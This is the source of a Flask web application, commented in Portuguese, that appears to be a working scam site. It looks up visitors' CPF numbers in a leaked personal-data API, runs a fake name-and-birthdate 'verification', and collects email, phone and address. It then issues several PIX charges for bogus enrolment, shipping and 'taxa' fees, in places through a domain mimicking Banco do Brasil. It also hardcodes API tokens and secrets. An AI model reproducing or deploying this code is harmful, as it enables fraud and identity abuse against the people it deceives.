# Imports e configuração básica
import os
import requests
import logging
import random
import gzip
from datetime import datetime, timedelta
from typing import Dict, Any, List
from flask import Flask, render_template, url_for, request, redirect, flash, session, jsonify, after_this_request
from flask_caching import Cache
from flask_sqlalchemy import SQLAlchemy

# Configuração do logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

# Inicialização do Flask e configurações
app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET_KEY")
app.static_folder = 'static'

# Configuração do cache
cache = Cache(app, config={
    'CACHE_TYPE': 'simple',
    'CACHE_DEFAULT_TIMEOUT': 600
})

# Configuração do SQLAlchemy
app.config["SQLALCHEMY_DATABASE_URI"] = os.environ.get("DATABASE_URL")
app.config["SQLALCHEMY_ENGINE_OPTIONS"] = {
    "pool_size": 50,
    "max_overflow": 25,
    "pool_timeout": 60,
    "pool_recycle": 1800,
    "pool_pre_ping": True,
}
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False

# Inicialização do SQLAlchemy
db = SQLAlchemy(app)

# Importa os modelos após a inicialização do db
from models import Usuario, Pagamento  # noqa

# Cria as tabelas no banco de dados
with app.app_context():
    db.create_all()

# Middleware de compressão
def gzip_response(response):
    # Não comprimir arquivos estáticos
    if request.path.startswith('/static/'):
        return response

    accept_encoding = request.headers.get('Accept-Encoding', '')
    if 'gzip' not in accept_encoding.lower():
        return response

    if (response.status_code < 200 or response.status_code >= 300 or
        'Content-Encoding' in response.headers):
        return response

    # Só comprimir se a resposta tiver dados
    if not response.data:
        return response

    try:
        gzip_buffer = gzip.compress(response.data)
        response.data = gzip_buffer
        response.headers['Content-Encoding'] = 'gzip'
        response.headers['Content-Length'] = len(response.data)
    except Exception as e:
        logger.error(f"Erro na compressão: {str(e)}")
        return response

    return response

@app.after_request
def after_request(response):
    return gzip_response(response)

API_URL = "https://consulta.fontesderenda.blog/?token=4da265ab-0452-4f87-86be-8d83a04a745a&cpf={cpf}"

ESTADOS = {
    'Acre': 'AC',
    'Alagoas': 'AL',
    'Amapá': 'AP',
    'Amazonas': 'AM',
    'Bahia': 'BA',
    'Ceará': 'CE',
    'Distrito Federal': 'DF',
    'Espírito Santo': 'ES',
    'Goiás': 'GO',
    'Maranhão': 'MA',
    'Mato Grosso': 'MT',
    'Mato Grosso do Sul': 'MS',
    'Minas Gerais': 'MG',
    'Pará': 'PA',
    'Paraíba': 'PB',
    'Paraná': 'PR',
    'Pernambuco': 'PE',
    'Piauí': 'PI',
    'Rio de Janeiro': 'RJ',
    'Rio Grande do Norte': 'RN',
    'Rio Grande do Sul': 'RS',
    'Rondônia': 'RO',
    'Roraima': 'RR',
    'Santa Catarina': 'SC',
    'São Paulo': 'SP',
    'Sergipe': 'SE',
    'Tocantins': 'TO'
}

def get_estado_from_ip(ip_address: str) -> str:
    """
    Obtém o estado baseado no IP do usuário usando um serviço de geolocalização
    """
    try:
        response = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success' and data.get('country') == 'Brazil':
                estado = data.get('region')
                # Procura o estado no dicionário de mapeamento
                for estado_nome, sigla in ESTADOS.items():
                    if sigla == estado:
                        return f"{estado_nome} - {sigla}"
    except Exception as e:
        logger.error(f"Erro ao obter localização do IP: {str(e)}")

    # Se não conseguir determinar o estado, retorna São Paulo como padrão
    return "São Paulo - SP"

def get_client_ip() -> str:
    """
    Obtém o IP do cliente, considerando possíveis proxies
    """
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0]
    else:
        ip = request.remote_addr
    return ip

def gerar_nomes_falsos(nome_real: str) -> list:
    nomes = [
        "MARIA SILVA SANTOS",
        "JOSE OLIVEIRA SOUZA",
        "ANA PEREIRA LIMA",
        "JOAO FERREIRA COSTA",
        "ANTONIO RODRIGUES ALVES",
        "FRANCISCO GOMES SILVA",
        "CARLOS SANTOS OLIVEIRA",
        "PAULO RIBEIRO MARTINS",
        "PEDRO ALMEIDA COSTA",
        "LUCAS CARVALHO LIMA"
    ]
    # Remove nomes que são muito similares ao nome real
    nomes = [n for n in nomes if len(set(n.split()) & set(nome_real.split())) == 0]
    # Seleciona 2 nomes aleatórios
    nomes_falsos = random.sample(nomes, 2)
    # Adiciona o nome real e embaralha
    todos_nomes = nomes_falsos + [nome_real]
    random.shuffle(todos_nomes)
    return todos_nomes

# Função auxiliar para gerar datas falsas
def gerar_datas_falsas(data_real_str: str) -> List[str]:
    data_real = datetime.strptime(data_real_str.split()[0], '%Y-%m-%d')
    datas_falsas = []

    for _ in range(2):
        dias = random.randint(-365*2, 365*2)
        data_falsa = data_real + timedelta(days=dias)
        datas_falsas.append(data_falsa)

    todas_datas = datas_falsas + [data_real]
    random.shuffle(todas_datas)

    return [data.strftime('%d/%m/%Y') for data in todas_datas]

@app.route('/consultar_cpf', methods=['POST'])
def consultar_cpf():
    cpf = request.form.get('cpf', '').strip()
    cpf_numerico = ''.join(filter(str.isdigit, cpf))

    if not cpf_numerico or len(cpf_numerico) != 11:
        flash('CPF inválido. Por favor, digite um CPF válido.')
        return redirect(url_for('index'))

    try:
        response = requests.get(
            API_URL.format(cpf=cpf_numerico),
            timeout=30
        )
        response.raise_for_status()
        dados = response.json()

        if dados and 'DADOS' in dados and 'NOME' in dados['DADOS']:
            dados_usuario = {
                'cpf': cpf_numerico,
                'nome_real': dados['DADOS']['NOME'],
                'data_nasc': dados['DADOS']['NASC'],
                'nomes': gerar_nomes_falsos(dados['DADOS']['NOME'])
            }
            session['dados_usuario'] = dados_usuario
            return render_template('verificar_nome.html',
                                dados=dados_usuario,
                                current_year=datetime.now().year)
        else:
            flash('CPF não encontrado ou dados incompletos.')
            return redirect(url_for('index'))

    except Exception as e:
        logger.error(f"Erro na consulta: {str(e)}")
        flash('Erro ao consultar CPF. Por favor, tente novamente.')
        return redirect(url_for('index'))

@app.route('/verificar_nome', methods=['POST'])
def verificar_nome():
    nome_selecionado = request.form.get('nome')
    dados_usuario = session.get('dados_usuario')

    if not dados_usuario or not nome_selecionado:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))

    if nome_selecionado != dados_usuario['nome_real']:
        flash('Nome selecionado incorreto. Por favor, tente novamente.')
        return redirect(url_for('index'))

    # Gera datas falsas para a próxima etapa
    datas = gerar_datas_falsas(dados_usuario['data_nasc'])
    dados_usuario['datas'] = datas
    session['dados_usuario'] = dados_usuario

    return render_template('verificar_data.html',
                         dados=dados_usuario,
                         current_year=datetime.now().year)

@app.route('/verificar_data', methods=['POST'])
def verificar_data():
    data_selecionada = request.form.get('data')
    dados_usuario = session.get('dados_usuario')

    if not dados_usuario or not data_selecionada:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))

    data_real = datetime.strptime(dados_usuario['data_nasc'].split()[0], '%Y-%m-%d').strftime('%d/%m/%Y')
    if data_selecionada != data_real:
        flash('Data selecionada incorreta. Por favor, tente novamente.')
        return redirect(url_for('index'))

    # Obtém o estado baseado no IP do usuário
    ip_address = get_client_ip()
    estado_atual = get_estado_from_ip(ip_address)

    return render_template('selecionar_estado.html', 
                         estado_atual=estado_atual,
                         current_year=datetime.now().year)

@app.route('/selecionar_estado', methods=['POST'])
def selecionar_estado():
    estado = request.form.get('estado')
    dados_usuario = session.get('dados_usuario')

    if not dados_usuario or not estado:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))

    # Salva o estado selecionado na sessão
    dados_usuario['estado'] = estado
    session['dados_usuario'] = dados_usuario

    # Redireciona para a seleção de nível, passando o estado selecionado
    return render_template('selecionar_nivel.html', 
                         estado=estado,
                         current_year=datetime.now().year)

@app.route('/selecionar_nivel', methods=['POST'])
def selecionar_nivel():
    nivel = request.form.get('nivel')
    dados_usuario = session.get('dados_usuario')

    if not dados_usuario or not nivel:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))

    # Salva o nível selecionado na sessão
    dados_usuario['nivel'] = nivel
    session['dados_usuario'] = dados_usuario

    # Redireciona para a página de contato
    return render_template('verificar_contato.html',
                         dados={
                             'name': dados_usuario['nome_real'],
                             'cpf': dados_usuario['cpf'],
                             'estado': dados_usuario['estado']
                         },
                         current_year=datetime.now().year)

@app.route('/verificar_contato', methods=['POST'])
def verificar_contato():
    email = request.form.get('email')
    telefone = request.form.get('telefone')
    dados_usuario = session.get('dados_usuario')

    if not dados_usuario or not email or not telefone:
        flash('Sessão expirada ou dados incompletos. Por favor, tente novamente.')
        return redirect(url_for('index'))

    # Adiciona os dados de contato ao objeto dados_usuario
    dados_usuario['email'] = email
    dados_usuario['phone'] = ''.join(filter(str.isdigit, telefone))  # Remove formatação
    session['dados_usuario'] = dados_usuario

    # Redireciona para a página de endereço
    return redirect(url_for('verificar_endereco'))

@app.route('/verificar_endereco', methods=['GET', 'POST'])
def verificar_endereco():
    dados_usuario = session.get('dados_usuario')
    if not dados_usuario:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))

    if request.method == 'POST':
        # Coleta os dados do formulário
        endereco = {
            'cep': request.form.get('cep'),
            'logradouro': request.form.get('logradouro'),
            'numero': request.form.get('numero'),
            'complemento': request.form.get('complemento'),
            'bairro': request.form.get('bairro'),
            'cidade': request.form.get('cidade'),
            'estado': request.form.get('estado')
        }

        # Valida se os campos obrigatórios foram preenchidos
        campos_obrigatorios = ['cep', 'logradouro', 'numero', 'bairro', 'cidade', 'estado']
        if not all(endereco.get(campo) for campo in campos_obrigatorios):
            flash('Por favor, preencha todos os campos obrigatórios.')
            return render_template('verificar_endereco.html', 
                                current_year=datetime.now().year)

        # Adiciona o endereço aos dados do usuário
        dados_usuario['endereco'] = endereco
        session['dados_usuario'] = dados_usuario

        # Redireciona para a página de aviso de pagamento
        return render_template('aviso_pagamento.html',
                            dados={'name': dados_usuario['nome_real'],
                                  'email': dados_usuario['email'],
                                  'phone': dados_usuario['phone'],
                                  'cpf': dados_usuario['cpf']},
                            current_year=datetime.now().year)

    # GET request - mostra o formulário
    return render_template('verificar_endereco.html',
                         current_year=datetime.now().year)


class For4PaymentsAPI:
    API_URL = "https://app.for4payments.com.br/api/v1"

    def __init__(self, secret_key: str):
        self.secret_key = secret_key

    def _get_headers(self) -> Dict[str, str]:
        return {
            'Authorization': self.secret_key,
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }

    def create_pix_payment(self, data: Dict[str, Any]) -> Dict[str, Any]:
        try:
            # Format and validate amount
            amount_in_cents = int(float(data['amount']) * 100)

            payment_data = {
                "name": data['name'],
                "email": data['email'],
                "cpf": ''.join(filter(str.isdigit, data['cpf'])),
                "phone": data.get('phone', ''),
                "paymentMethod": "PIX",
                "amount": amount_in_cents,
                "items": [{
                    "title": "FINALIZAR INSCRICAO",
                    "quantity": 1,
                    "unitPrice": amount_in_cents,
                    "tangible": False
                }]
            }

            response = requests.post(
                f"{self.API_URL}/transaction.purchase",
                json=payment_data,
                headers=self._get_headers(),
                timeout=30
            )

            if response.status_code == 200:
                response_data = response.json()
                return {
                    'id': response_data.get('id'),
                    'pixCode': response_data.get('pixCode'),
                    'pixQrCode': response_data.get('pixQrCode'),
                    'expiresAt': response_data.get('expiresAt'),
                    'status': response_data.get('status', 'pending')
                }
            else:
                logger.error(f"Erro na API de pagamento: {response.text}")
                raise ValueError("Erro ao processar pagamento")

        except Exception as e:
            logger.error(f"Erro ao criar pagamento: {str(e)}")
            raise

    def check_payment_status(self, payment_id: str) -> Dict[str, Any]:
        """Check the status of a payment"""
        try:
            response = requests.get(
                f"{self.API_URL}/transaction.getPayment",
                params={'id': payment_id},
                headers=self._get_headers(),
                timeout=30
            )

            logger.info(f"Payment status check response: {response.status_code}")
            logger.debug(f"Payment status response body: {response.text}")

            if response.status_code == 200:
                payment_data = response.json()
                # Map For4Payments status to our application status
                status_mapping = {
                    'PENDING': 'pending',
                    'PROCESSING': 'pending',
                    'APPROVED': 'completed',
                    'COMPLETED': 'completed',
                    'PAID': 'completed',
                    'EXPIRED': 'failed',
                    'FAILED': 'failed',
                    'CANCELED': 'cancelled',
                    'CANCELLED': 'cancelled'
                }

                current_status = payment_data.get('status', 'PENDING')
                mapped_status = status_mapping.get(current_status, 'pending')

                logger.info(f"Payment {payment_id} status: {current_status} -> {mapped_status}")

                return {
                    'status': mapped_status,
                    'pix_qr_code': payment_data.get('pixQrCode'),
                    'pix_code': payment_data.get('pixCode')
                }
            elif response.status_code == 404:
                logger.warning(f"Payment {payment_id} not found")
                return {'status': 'pending'}
            else:
                error_message = f"Failed to fetch payment status (Status: {response.status_code})"
                logger.error(error_message)
                return {'status': 'pending'}

        except Exception as e:
            logger.error(f"Error checking payment status: {str(e)}")
            return {'status': 'pending'}


def create_payment_api() -> For4PaymentsAPI:
    secret_key = os.environ.get("FOR4PAYMENTS_SECRET_KEY", "ff127456-ef71-4f49-ba84-21ec10b95d65")
    return For4PaymentsAPI(secret_key)

@app.route('/')
@cache.cached(timeout=60)  # Cache da página inicial por 1 minuto
def index():
    today = datetime.now()
    logger.debug(f"Current date - Year: {today.year}, Month: {today.month}, Day: {today.day}")
    return render_template('index.html', 
                         current_year=today.year,
                         current_month=str(today.month).zfill(2),
                         current_day=str(today.day).zfill(2))


@app.route('/frete_apostila', methods=['GET', 'POST'])
def frete_apostila():
    user_data = session.get('dados_usuario') 
    if not user_data:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))

    if request.method == 'POST':
        try:
            # Coleta os dados do formulário
            endereco = {
                'cep': request.form.get('cep'),
                'logradouro': request.form.get('street'),
                'numero': request.form.get('number'),
                'complemento': request.form.get('complement'),
                'bairro': request.form.get('neighborhood'),
                'cidade': request.form.get('city'),
                'estado': request.form.get('state')
            }

            # Valida se os campos obrigatórios foram preenchidos
            campos_obrigatorios = ['cep', 'logradouro', 'numero', 'bairro', 'cidade', 'estado']
            if not all(endereco.get(campo) for campo in campos_obrigatorios):
                flash('Por favor, preencha todos os campos obrigatórios.')
                return render_template('frete_apostila.html', 
                                    user_data=user_data,
                                    current_year=datetime.now().year)

            # Salva o endereço na sessão
            user_data['endereco'] = endereco
            session['dados_usuario'] = user_data

            # Gera o pagamento PIX
            payment_api = create_payment_api()
            payment_data = {
                'name': user_data['nome_real'], 
                'email': user_data.get('email', generate_random_email()), 
                'cpf': user_data['cpf'],
                'phone': user_data.get('phone', generate_random_phone()), 
                'amount': 48.19  # Valor do frete
            }

            pix_data = payment_api.create_pix_payment(payment_data)
            return render_template('pagamento.html',
                               pix_data=pix_data,
                               valor_total="48,19",
                               current_year=datetime.now().year)

        except Exception as e:
            logger.error(f"Erro ao processar formulário: {e}")
            flash('Erro ao processar o formulário. Por favor, tente novamente.')
            return redirect(url_for('frete_apostila'))

    return render_template('frete_apostila.html', 
                         user_data=user_data,
                         current_year=datetime.now().year)

@app.route('/pagamento', methods=['GET', 'POST'])
def pagamento():
    user_data = session.get('dados_usuario') 
    if not user_data:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))

    try:
        payment_api = create_payment_api()
        payment_data = {
            'name': user_data['nome_real'], 
            'email': user_data.get('email', generate_random_email()), 
            'cpf': user_data['cpf'],
            'phone': user_data.get('phone', generate_random_phone()), 
            'amount': 247.10  
        }

        pix_data = payment_api.create_pix_payment(payment_data)
        return render_template('pagamento.html',
                           pix_data=pix_data,
                           valor_total="247,10",
                           current_year=datetime.now().year)

    except Exception as e:
        logger.error(f"Erro ao gerar pagamento: {e}")
        flash('Erro ao gerar o pagamento. Por favor, tente novamente.')
        return redirect(url_for('index'))

@app.route('/pagamento_categoria', methods=['POST'])
def pagamento_categoria():
    user_data = session.get('dados_usuario') 
    if not user_data:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('obrigado'))

    categoria = request.form.get('categoria')
    if not categoria:
        flash('Categoria não especificada.')
        return redirect(url_for('obrigado'))

    try:
        payment_api = create_payment_api()
        payment_data = {
            'name': user_data['nome_real'], 
            'email': user_data.get('email', generate_random_email()), 
            'cpf': user_data['cpf'],
            'phone': user_data.get('phone', generate_random_phone()), 
            'amount': 114.10  
        }

        pix_data = payment_api.create_pix_payment(payment_data)
        return render_template('pagamento_categoria.html',
                           pix_data=pix_data,
                           valor_total="114,10",
                           categoria=categoria,
                           current_year=datetime.now().year)

    except Exception as e:
        logger.error(f"Erro ao gerar pagamento da categoria: {e}")
        flash('Erro ao gerar o pagamento. Por favor, tente novamente.')
        return redirect(url_for('obrigado'))

@app.route('/check_payment/<payment_id>')
def check_payment(payment_id):
    try:
        payment_api = create_payment_api()
        status_data = payment_api.check_payment_status(payment_id)
        return jsonify(status_data)
    except Exception as e:
        logger.error(f"Error checking payment status: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/obrigado')
@cache.cached(timeout=300)  # Cache por 5 minutos
def obrigado():
    user_data = session.get('dados_usuario') 
    if not user_data:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))
    return render_template('obrigado.html', 
                         current_year=datetime.now().year,
                         user_data=user_data)

@app.route('/categoria/<tipo>')
def categoria(tipo):
    user_data = session.get('dados_usuario') 
    if not user_data:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))
    return render_template(f'categoria_{tipo}.html', 
                         current_year=datetime.now().year,
                         user_data=user_data)

@app.route('/taxa')
@cache.cached(timeout=300)  # Cache por 5 minutos
def taxa():
    return render_template('taxa.html', current_year=datetime.now().year)

@app.route('/verificar_taxa', methods=['POST'])
def verificar_taxa():
    cpf = request.form.get('cpf', '').strip()
    cpf_numerico = ''.join(filter(str.isdigit, cpf))

    if not cpf_numerico or len(cpf_numerico) != 11:
        flash('CPF inválido. Por favor, digite um CPF válido.')
        return redirect(url_for('taxa'))

    try:
        # Consulta à API
        response = requests.get(
            f"https://inscricao-bb.org/api_clientes.php?cpf={cpf_numerico}",
            timeout=30
        )
        response.raise_for_status()
        dados = response.json()

        if dados and 'name' in dados:
            session['dados_taxa'] = dados

            # Generate PIX payment
            try:
                payment_api = create_payment_api()
                payment_data = {
                    'name': dados['name'],
                    'email': dados['email'],
                    'cpf': dados['cpf'],
                    'phone': dados['phone'],
                    'amount': 82.10
                }

                logger.info(f"Generating PIX payment for CPF: {cpf_numerico}")
                pix_data = payment_api.create_pix_payment(payment_data)
                logger.info(f"PIX data generated successfully: {pix_data}")

                return render_template('taxa_pendente.html',
                                    dados=dados,
                                    pix_data=pix_data,
                                    current_year=datetime.now().year)
            except Exception as e:
                logger.error(f"Erro ao gerar pagamento: {e}")
                flash('Erro ao gerar o pagamento. Por favor, tente novamente.')
                return redirect(url_for('taxa'))
        else:
            flash('CPF não encontrado ou dados incompletos.')
            return redirect(url_for('taxa'))

    except Exception as e:
        logger.error(f"Erro na consulta: {str(e)}")
        flash('Erro ao consultar CPF. Por favor, tente novamente.')
        return redirect(url_for('taxa'))

@app.route('/pagamento_taxa', methods=['POST'])
def pagamento_taxa():
    dados = session.get('dados_taxa')
    if not dados:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('taxa'))

    try:
        payment_api = create_payment_api()
        payment_data = {
            'name': dados['name'],
            'email': dados['email'],
            'cpf': dados['cpf'],
            'phone': dados['phone'],
            'amount': 82.10
        }

        pix_data = payment_api.create_pix_payment(payment_data)
        return render_template('pagamento.html',
                           pix_data=pix_data,
                           valor_total="82,10",
                           current_year=datetime.now().year)

    except Exception as e:
        logger.error(f"Erro ao gerar pagamento: {e}")
        flash('Erro ao gerar o pagamento. Por favor, tente novamente.')
        return redirect(url_for('taxa'))

def generate_random_email():
    return f"user_{random.randint(1,1000)}@example.com"

def generate_random_phone():
    return f"55119{random.randint(10000000,99999999)}"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)